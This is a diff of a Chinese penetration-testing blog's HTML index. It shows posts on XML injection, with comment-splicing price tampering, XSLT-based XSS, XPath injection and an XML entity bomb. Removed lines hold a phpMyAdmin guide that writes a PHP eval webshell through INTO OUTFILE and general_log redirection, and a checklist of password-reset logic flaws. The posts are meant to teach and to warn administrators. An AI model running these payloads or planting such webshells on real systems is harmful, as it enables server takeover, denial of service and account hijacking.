+<p>但是如果用户的输入没有经过严格的过滤就写入xml，然后再提取出来使用时，我们就可以通过控制phone和address来更改price的值。</p>
+<p>我们可以在phone中手动闭合前面的phone并构造注释符：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">13200000000&lt;/phone&gt;&lt;!--</span><br></pre></td></tr></table></figure></p>
+<p>然后在address的值中闭合注释符，然后构造一个新的price，输入我们想要的价格：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&gt;&lt;price&gt;1&lt;/price&gt;&lt;address&gt;shanghai&lt;/address&gt;</span><br></pre></td></tr></table></figure></p>
+<p>拼接起来就是<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">phone</span>&gt;</span>13200000000<span class="tag">&lt;/<span class="name">phone</span>&gt;</span><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&lt;price&gt;200&lt;/price&gt;</span></span><br><span class="line"><span class="comment">&lt;address&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">price</span>&gt;</span>1<span class="tag">&lt;/<span class="name">price</span>&gt;</span><span class="tag">&lt;<span class="name">address</span>&gt;</span>shanghai<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>然后注释符注释掉中间的部分，剩下的价格就变成了1元。</p>
+<p>这就是xml数据注入攻击。</p>
+<h3 id="应对"><a href="#应对" class="headerlink" title="应对"></a>应对</h3><ul>
+<li>严格过滤用户输入</li>
+</ul>
+<h2 id="0x02-xml样式表注入"><a href="#0x02-xml样式表注入" class="headerlink" title="0x02 xml样式表注入"></a>0x02 xml样式表注入</h2><p>在xml文件中允许使用样式表，这种样式表能够将已有的xml数据转换成新的xml数据，然后以html方式在web浏览器中展示。</p>
+<p>假设xml引用了一个超链接，而链接内容用户可控<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link&gt;test&lt;/link&gt;</span><br></pre></td></tr></table></figure></p>
+<p>web服务器利用xstl语言将上面的xml转换成这样的html：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A href=&quot;test&quot;&gt;test&lt;/A&gt;</span><br></pre></td></tr></table></figure></p>
+<p>那么如果我们将test改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;#&quot; onclick=&quot;alert(1)&quot; /&gt;&lt;!--</span><br></pre></td></tr></table></figure></p>
+<p>那么很容易引发跨站脚本攻击。</p>
+<p>如果引发了跨站脚本攻击，我们将onclick之后的内容改成我们xss盲打平台上的内容，就可以实施攻击了。</p>
+<h3 id="应对-1"><a href="#应对-1" class="headerlink" title="应对"></a>应对</h3><ul>
+<li>严格过滤用户输入</li>
+<li>敏感位置不能使用户可控</li>
+</ul>
+<h2 id="0x03-XPATH-XQuery注入"><a href="#0x03-XPATH-XQuery注入" class="headerlink" title="0x03 XPATH/XQuery注入"></a>0x03 XPATH/XQuery注入</h2><p>XPATH和XQuery是能够查询xml文档的语言，类似于结构化查询语言(sql)，假设xml中包含账号密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&apos;1.0&apos;?&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;author&gt;</span><br><span class="line">&lt;user&gt;jack&lt;/user&gt;</span><br><span class="line">&lt;pass&gt;123456&lt;/pass&gt;</span><br><span class="line">&lt;/author&gt;</span><br><span class="line">&lt;author&gt;</span><br><span class="line">&lt;user&gt;alice&lt;/user&gt;</span><br><span class="line">&lt;pass&gt;abc123456&lt;/pass&gt;</span><br><span class="line">&lt;/author&gt;</span><br><span class="line">&lt;author&gt;</span><br><span class="line">&lt;user&gt;lucy&lt;/user&gt;</span><br><span class="line">&lt;pass&gt;qwer1234&lt;/pass&gt;</span><br><span class="line">&lt;/author&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
+<p>系统正常情况下通过如下语句来查询xml数据，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//*[contains(user, &apos;jack&apos; )]/name</span><br></pre></td></tr></table></figure></p>
+<p>其中jack是用户可控制的，如果我们修改以上语句为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//*[contains(user, &apos;x&apos; )] | //*| //*[contains(user, &apos;y&apos; )]/name</span><br></pre></td></tr></table></figure>
+<p>|是或运算符号，//*是查询所有，这样就会返回所有用户的数据。</p>
+<h2 id="0x04-xml实体循环ddos"><a href="#0x04-xml实体循环ddos" class="headerlink" title="0x04 xml实体循环ddos"></a>0x04 xml实体循环ddos</h2><p>如果我们可以控制xml，那么我们可以在xml中添加如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %xxx &apos;&amp;#x25;yyy&apos;&gt;</span><br><span class="line">&lt;!ENTITY %yyy &apos;&amp;#x25;xxx&apos;&gt;</span><br><span class="line">%xxx;</span><br></pre></td></tr></table></figure></p>
+<p>这个代码执行到最后一行，就会重复的执行前面的命令进入死循环，耗费服务器资源。</p>
+<h2 id="0x05-xml炸弹ddos"><a href="#0x05-xml炸弹ddos" class="headerlink" title="0x05 xml炸弹ddos"></a>0x05 xml炸弹ddos</h2><p>如果我们可以控制xml，那么我们可以在xml中添加如下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE something[</span><br><span class="line">&lt;!ENTITY X0 &quot;testdata&quot;&gt;</span><br><span class="line">&lt;!ENTITY X1 &quot;&amp;x0;&amp;x0;&quot;&gt;</span><br><span class="line">&lt;!ENTITY X2 &quot;&amp;x1;&amp;x1;&quot;&gt;</span><br><span class="line">&lt;!ENTITY X3 &quot;&amp;x2;&amp;x2;&quot;&gt;</span><br><span class="line">···</span><br><span class="line">&lt;!ENTITY X100 &quot;&amp;x99;&amp;x99;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;something&gt;&amp;x100;&lt;/something&gt;</span><br></pre></td></tr></table></figure>
+<p>当这个语句执行完的时候，原本的testdata就会经过指数式的增长，变成一个超大的字符串，极大的耗费服务器资源。</p>
+<h2 id="0x06-xml外部实体注入"><a href="#0x06-xml外部实体注入" class="headerlink" title="0x06 xml外部实体注入"></a>0x06 xml外部实体注入</h2><p>xml外部实体注入在前面的博客中写过，可以参考：</p>
+<p><a href="http://uuzdaisuki.com/2018/05/03/%E6%B5%85%E8%B0%88XXE%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://uuzdaisuki.com/2018/05/03/%E6%B5%85%E8%B0%88XXE%E6%BC%8F%E6%B4%9E/</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/11/一次localhost被劫持发现的盗版系统后门/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1741,959 +2614,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/22/phpmyadmin注入webshell总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/06/22/phpmyadmin注入webshell总结/" itemprop="url">
-                  phpmyadmin注入webshell总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-22T13:36:33+08:00">
-                2018-06-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/06/22/phpmyadmin注入webshell总结/" class="leancloud_visitors" data-flag-title="phpmyadmin注入webshell总结">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>有时候，我们扫到了暴露在公网的phpmyadmin页面，并且能爆破出密码时，我们就可以对目标数据库做一些操作了，这个时候我们想进一步拿到webshell，就有很多种办法可以尝试。</p>
-<p>以下技巧不仅仅能在已经进入phpmyadmin的情况下使用，其他的管理系统或者只要是拥有一定权限的mysql执行环境都可以使用。</p>
-<h2 id="0x01-寻找物理路径"><a href="#0x01-寻找物理路径" class="headerlink" title="0x01 寻找物理路径"></a>0x01 寻找物理路径</h2><p>我们进入phpmyadmin之后想要写webshell，得先知道网站物理路径，才能通过其他办法将构造好的一句话木马写入。所以第一步就是寻找物理路径。</p>
-<h3 id="phpinfo泄露"><a href="#phpinfo泄露" class="headerlink" title="phpinfo泄露"></a>phpinfo泄露</h3><p>物理路径大多是一些页面未作限制导致敏感信息泄露的，所以我们首先从敏感信息泄露入手，方法一般为扫网站目录，如果能得到phpinfo等敏感文件，就很容易得到物理路径。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin01.png?raw=true" alt=""></p>
-<h3 id="错误页面泄露"><a href="#错误页面泄露" class="headerlink" title="错误页面泄露"></a>错误页面泄露</h3><p>有的网站，访问错误页面会提示网站路径，也可以在这方面入手。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin02.png?raw=true" alt=""></p>
-<p>想要找到网站错误页面，可以尝试：</p>
-<ul>
-<li>单引号爆路径： 在页面后门加单引号，如果网站没有过滤单引号且产生错误，一般会返回错误页面可以读取到物理路径。</li>
-<li>错误参数值爆路径： 在可以post参数的位置，提交错误参数使网站出错，有时会得到物理路径。</li>
-<li>Google爆路径： 通过google语法搜索对应网站包含warning、fatal error的页面，如Site:xxx.com warning和Site:xxx.com.cn “fatal error”，很容易找到错误路径。</li>
-<li>错误解析爆路径： 很多服务器，如果访问一个不存在的php页面等因为不存在而无法解析的页面，会返回解析错误页面，会得到物理路径。</li>
-</ul>
-<h3 id="phpmyadmin爆路径"><a href="#phpmyadmin爆路径" class="headerlink" title="phpmyadmin爆路径"></a>phpmyadmin爆路径</h3><p>找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。</p>
-<p>如：</p>
-<ul>
-<li>1./phpmyadmin/libraries/lect_lang.lib.php</li>
-<li>2./phpMyAdmin/index.php?lang[]=1</li>
-<li>3./phpMyAdmin/phpinfo.php</li>
-<li>4.load_file()</li>
-<li>5./phpmyadmin/themes/darkblue_orange/layout.inc.php</li>
-<li>6./phpmyadmin/libraries/select_lang.lib.php</li>
-<li>7./phpmyadmin/libraries/lect_lang.lib.php</li>
-<li>8./phpmyadmin/libraries/mcrypt.lib.php</li>
-</ul>
-<h3 id="猜路径"><a href="#猜路径" class="headerlink" title="猜路径"></a>猜路径</h3><p>如果上述方法都没有找到物理路径，我们就得开始猜路径了。</p>
-<p>可以通过常用的网站套件默认路径来猜，如：</p>
-<ul>
-<li>lamp套件： /var/www/html/index.php</li>
-<li>lnmp套件： /home/wwwroot/default</li>
-<li>wamp套件： C:/wamp/www或者D:/wamp/www</li>
-<li>iis服务器： D:/vhost/wwwroot/www</li>
-<li>phpstudy套件： D:/phpstudy/www</li>
-</ul>
-<p>还有非常多，可以自己根据实际情况去搜索。</p>
-<h2 id="0x02-直接写出文件"><a href="#0x02-直接写出文件" class="headerlink" title="0x02 直接写出文件"></a>0x02 直接写出文件</h2><p>物理路径知道了，这个时候我们该在可以访问的物理路径上写webshell了。</p>
-<p>首先我们要确认mysql是否有写文件的权限，可以通过访问secure-file-priv来查看是否有写文件的权限：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%secure%&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin03.png?raw=true" alt=""></p>
-<p>可以看到我本机的情况是只能在F:/wamp/tmp文件夹下进行写文件，这里secure-file-priv有三种情况：</p>
-<ul>
-<li>NULL： 没有任何路径的写权限。</li>
-<li>‘’： 拥有任何路径的写权限。</li>
-<li>F:/wamp/tmp一类的文件路径： 仅在规定路径下有写权限。</li>
-</ul>
-<p>我们这里如果想直接写文件，需要在www目录下有写权限，为了查看效果，我们先将secure-file-priv改成’’来尝试一下直接写文件。</p>
-<p>要注意，在root账户下的mysql中，也是无法直接对secure-file-priv进行更改的，要更改secure-file-priv，需要打开my.ini文件，将secure_file_priv的值更改，我们在这里将原本的secure-file-priv注释掉，然后写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv=&quot;&quot;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin04.png?raw=true" alt=""></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin05.png?raw=true" alt=""></p>
-<p>然后我们在phpmyadmin的mysql控制台输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Create TABLE shell (webshell text NOT NULL);</span><br><span class="line">Insert INTO shell (webshell) VALUES(&apos;&lt;?php @eval($_POST[123456]);?&gt;&apos;);</span><br><span class="line">select webshell from shell into outfile &apos;F:/wamp/www/eval.php&apos;;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin06.png?raw=true" alt=""></p>
-<p>然后通过菜刀访问：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin07.png?raw=true" alt=""></p>
-<h2 id="0x03-使用log文件"><a href="#0x03-使用log文件" class="headerlink" title="0x03 使用log文件"></a>0x03 使用log文件</h2><p>那么如果是一般的情况，我们只有其他路径权限或者完全没有写权限的时候该怎么做呢？此时有个奇淫技巧，就是使用log文件来写一句话木马。</p>
-<p>phpmyadmin有一个负责mysql日志的文件，通常是关闭的，因为如果一直打开，这个文件随着mysql的查询会变的非常非常的巨大，只有调试时才会有管理员打开。</p>
-<p>不过不同于上面的secure-file-priv无法通过mysql的root账户更改，这个功能是可以直接在mysql的root账户更改的。</p>
-<p>首先我们查看一下这个功能相关的变量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%general_log%&apos;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin08.png?raw=true" alt=""></p>
-<p>可以看到两个变量，其中general_log代表日志功能的开关，general_log_file代表日志功能存储的位置，这都是我们可控的变量，现在我们就要把general_log_file改到可以访问的网站目录中的文件，并且把日志功能开启。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file=&quot;F:/wamp/www/shell.php&quot;</span><br><span class="line">set global general_log=&quot;ON&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin09.png?raw=true" alt=""></p>
-<p>此时我们就打开了日志功能并且将日志保存路径切换到网站根目录下的shell.php</p>
-<p>然后我们只需要查询一个一句话木马（注意这里用双引号单引号混用的方法构造select，否则写在日志文件中php会解析错误）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &apos;&lt;?php @eval($_POST[&quot;123456&quot;]);?&gt;&apos;;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin10.png?raw=true" alt=""></p>
-<p>就可以通过菜刀连接木马：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin11.png?raw=true" alt=""></p>
-<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>从这次的思路看，如果我们拿到phpmyadmin或者其他的数据库管理工具，甚至直接拿到mysql控制台权限，都可以尝试进一步拿到webshell，而且很可能权限还非常高，可以进一步控制整个服务器。所以将phpmyadmin等页面暴露在公网是十分危险的。</p>
-<p>而且一直以来有很多网站管理员觉得服务器报错之后暴露些物理路径之类的东西无伤大雅，就不写专用的404页面，但是这次的思路也证明了，你的任何一个小失误，都有可能成为黑客入侵的助力，在敏感信息泄露和未授权访问等问题上一定要谨慎。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/21/任意密码重置总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/06/21/任意密码重置总结/" itemprop="url">
-                  任意密码重置总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-21T11:51:33+08:00">
-                2018-06-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/06/21/任意密码重置总结/" class="leancloud_visitors" data-flag-title="任意密码重置总结">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>密码重置是业务中十分重要且敏感的一环，在这里产生过很多任意密码重置的问题，是逻辑漏洞中很常见的一种。在这里总结一下任意密码重置的常见姿势。</p>
-<h2 id="0x01-验证码不失效"><a href="#0x01-验证码不失效" class="headerlink" title="0x01 验证码不失效"></a>0x01 验证码不失效</h2><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>验证码不失效是多年前最常见的一种逻辑漏洞，其原理是找回密码判断时，仅判断验证码是否正确，没有对验证码的过期时间进行限制，导致可以进行爆破。</p>
-<h4 id="测试方法："><a href="#测试方法：" class="headerlink" title="测试方法："></a>测试方法：</h4><p>通过枚举验证码直到找到真正的验证码跳转更改密码页面。</p>
-<h2 id="0x02-验证码回显"><a href="#0x02-验证码回显" class="headerlink" title="0x02 验证码回显"></a>0x02 验证码回显</h2><h4 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h4><p>验证码回显是指发送验证码后，可以通过抓包等方式得到正确的验证码，直接填写验证码跳转更改密码页面。</p>
-<h4 id="测试方法：-1"><a href="#测试方法：-1" class="headerlink" title="测试方法："></a>测试方法：</h4><p>通过截断数据包分析验证码是否直接写在cookie或者其他的字段中，如果捕获到，就可以直接填写。</p>
-<h2 id="0x03-验证码不绑定用户"><a href="#0x03-验证码不绑定用户" class="headerlink" title="0x03 验证码不绑定用户"></a>0x03 验证码不绑定用户</h2><h4 id="原理：-2"><a href="#原理：-2" class="headerlink" title="原理："></a>原理：</h4><p>输入手机号和验证码进行重置密码的时候，仅对验证码是够正确进行了判断，未对该验证码是否与手机号匹配做验证。</p>
-<h4 id="测试方法：-2"><a href="#测试方法：-2" class="headerlink" title="测试方法："></a>测试方法：</h4><p>在提交手机号和验证码的时候，替换手机号为其他手机号进行测试，成功通过验证并重置其密码。</p>
-<h2 id="0x04-用户名未绑定邮箱号-手机号"><a href="#0x04-用户名未绑定邮箱号-手机号" class="headerlink" title="0x04 用户名未绑定邮箱号/手机号"></a>0x04 用户名未绑定邮箱号/手机号</h2><h4 id="原理：-3"><a href="#原理：-3" class="headerlink" title="原理："></a>原理：</h4><p>用户名、手机号、验证码三者没有统一进行验证，仅判断了三者中的手机号和验证是否匹配和正确，如果正确则判断成功并进入密码修改界面。</p>
-<h4 id="测试方法：-3"><a href="#测试方法：-3" class="headerlink" title="测试方法："></a>测试方法：</h4><p>输入用户名获取验证码，通过抓包修改接收验证码的手机号为自己的号码，自己手机成功接收验证码，提交到网站进行验证，验证成功并进入密码修改界面。</p>
-<h2 id="0x05-客户端验证绕过"><a href="#0x05-客户端验证绕过" class="headerlink" title="0x05 客户端验证绕过"></a>0x05 客户端验证绕过</h2><h4 id="原理：-4"><a href="#原理：-4" class="headerlink" title="原理："></a>原理：</h4><p>客户端在本地进行验证码是否正确的判断，主要是根据接收到验证成功或验证失败的包判断是否验证成功，而该判断结果也可以在本地修改，最终导致欺骗客户端，进入密码修改界面。</p>
-<h4 id="测试方法：-4"><a href="#测试方法：-4" class="headerlink" title="测试方法："></a>测试方法：</h4><p>重置目标用户，输入错误验证码，修改返回包，把返回错误信息的包改为返回正确信息的包，即可绕过验证步骤，最终重置用户密码。</p>
-<h2 id="0x06-跳过身份检验"><a href="#0x06-跳过身份检验" class="headerlink" title="0x06 跳过身份检验"></a>0x06 跳过身份检验</h2><h4 id="原理：-5"><a href="#原理：-5" class="headerlink" title="原理："></a>原理：</h4><p>信任域问题，用户输入验证码，直接跳转到设置新密码的这一步，服务器默认已经通过检验，值得信赖，于是便未再次作检验，就可以直接重置密码。</p>
-<h4 id="测试方法：-5"><a href="#测试方法：-5" class="headerlink" title="测试方法："></a>测试方法：</h4><p>使用一个已知验证码账户记录每一步的链接，然后重置他人账户，点击获取验证码步骤之后直接手动控制网址跳转到输入新密码界面，重置其密码。</p>
-<h2 id="0x07-修改新密码时未校验用户字段"><a href="#0x07-修改新密码时未校验用户字段" class="headerlink" title="0x07 修改新密码时未校验用户字段"></a>0x07 修改新密码时未校验用户字段</h2><h4 id="原理：-6"><a href="#原理：-6" class="headerlink" title="原理："></a>原理：</h4><p>在重置密码界面，没有再次对用户ID进行校验，导致提交参数时可以将用户ID更改，从而修改其他用户的密码。</p>
-<h4 id="测试方法：-6"><a href="#测试方法：-6" class="headerlink" title="测试方法："></a>测试方法：</h4><p>使用自己账号和自己手机号进行密码重置，在最后重置密码时，抓包修改用户id相关信息，修改他人密码。</p>
-<h2 id="0x08-cookie替换"><a href="#0x08-cookie替换" class="headerlink" title="0x08 cookie替换"></a>0x08 cookie替换</h2><h4 id="原理：-7"><a href="#原理：-7" class="headerlink" title="原理："></a>原理：</h4><p>重置密码时通过用户cookie判断用户是否通过了手机验证，而cookie值是用户可控的，可以通过修改cookie中的值欺骗服务器自己通过了验证来修改密码。</p>
-<h4 id="测试方法：-7"><a href="#测试方法：-7" class="headerlink" title="测试方法："></a>测试方法：</h4><p>是用自己账号和手机号进行密码重置，在重置密码时，将cookie提取出来分析，如果服务器通过cookie判断是否通过手机验证，就使用他人账号进行重置，然后将cookie中判断是否通过验证的值改为已通过状态，即可重置密码。</p>
-<h2 id="0x09-利用CSRF漏洞重置密码"><a href="#0x09-利用CSRF漏洞重置密码" class="headerlink" title="0x09 利用CSRF漏洞重置密码"></a>0x09 利用CSRF漏洞重置密码</h2><h4 id="原理：-8"><a href="#原理：-8" class="headerlink" title="原理："></a>原理：</h4><p>如果登陆状态可直接修改密码，且密码修改的请求没有验证token、referer也没有设置跨域权限。</p>
-<h4 id="测试方法：-8"><a href="#测试方法：-8" class="headerlink" title="测试方法："></a>测试方法：</h4><p>用自己账号重置密码，在修改密码部分将请求截断，然后伪装链接发给他人，受害者在登陆状态误点链接即会被修改密码。</p>
-<h2 id="0x10-总结"><a href="#0x10-总结" class="headerlink" title="0x10 总结"></a>0x10 总结</h2><p>任意密码重置是各个提供用户注册的企业都会面临的一个问题，在这方面稍有不慎就会产生很严重的后果。</p>
-<p>而这类漏洞，黑盒测试的效果远大于白盒审计，所以总结了各种常见情况的测试方法，通过渗透测试来寻找漏洞，规避风险。</p>
-<p>参考文档： <a href="http://teagle.top/index.php/logic.html" target="_blank" rel="noopener">http://teagle.top/index.php/logic.html</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/20/机机器学习-2-——线性回归/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
